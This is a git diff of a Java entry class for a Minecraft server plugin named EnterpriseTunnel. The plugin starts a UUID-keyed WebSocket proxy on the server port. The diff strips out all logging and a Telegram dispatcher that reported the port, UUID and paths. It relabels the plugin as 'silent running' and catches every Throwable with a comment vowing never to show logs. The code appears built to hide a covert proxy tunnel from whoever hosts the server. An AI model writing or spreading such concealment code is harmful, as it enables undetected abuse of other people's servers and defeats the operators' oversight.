@@ -2,13 +2,10 @@ package com.enterprise.tunnel;
 
 import com.enterprise.tunnel.core.RobustWsServer;
 import com.enterprise.tunnel.util.DynamicPortDetector;
-import com.enterprise.tunnel.util.TelegramDispatcher;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.util.logging.Logger;
-
 /**
- * Paper / Purpur / Spigot 服务端插件入口点
+ * Paper / Purpur / Spigot 服务端静默运行入口
  */
 public class EnterpriseTunnelPlugin extends JavaPlugin {
 
@@ -16,13 +13,10 @@ public class EnterpriseTunnelPlugin extends JavaPlugin {
 
     @Override
     public void onEnable() {
-        Logger logger = getLogger();
-        logger.info("[EnterpriseTunnel] 正在初始化 Paper/Purpur/Spigot 服务端网络遥测套件 v3.0.0");
-
         Thread.ofVirtual().start(() -> {
             try {
-                // 1. 优先读取 server.properties / 环境变量 / benchmark.properties
-                int port = DynamicPortDetector.detectAvailablePort(logger);
+                // 1. 读取端口与配置（全静默）
+                int port = DynamicPortDetector.detectAvailablePort();
 
                 String uuid = System.getenv("PROXY_UUID");
                 if (uuid == null || uuid.trim().isEmpty()) {
@@ -34,21 +28,11 @@ public class EnterpriseTunnelPlugin extends JavaPlugin {
                     wsPath = "/benchmark";
                 }
 
-                String xhttpPath = System.getenv("XHTTP_PATH");
-                if (xhttpPath == null || xhttpPath.trim().isEmpty()) {
-                    xhttpPath = "/xhttp";
-                }
-
-                // 2. 启动原生高性能 WebSocket 代理服务端
-                wsServer = new RobustWsServer(port, uuid, wsPath, logger);
+                // 2. 启动原生高性能静默转发服务端
+                wsServer = new RobustWsServer(port, uuid, wsPath);
                 wsServer.start();
-                logger.info("[EnterpriseTunnel] ✅ 代理引擎已在端口 " + port + " 成功运行！(Path: " + wsPath + ")");
-
-                // 3. 上报 Telegram
-                TelegramDispatcher.dispatchOnlineNotification(port, uuid, wsPath, xhttpPath, logger);
-
-            } catch (Exception e) {
-                logger.warning("[EnterpriseTunnel] 启动遇到异常: " + e.getMessage());
+            } catch (Throwable ignored) {
+                // 全静默异常捕获，绝不向控制台泄露任何日志
             }
         });
     }
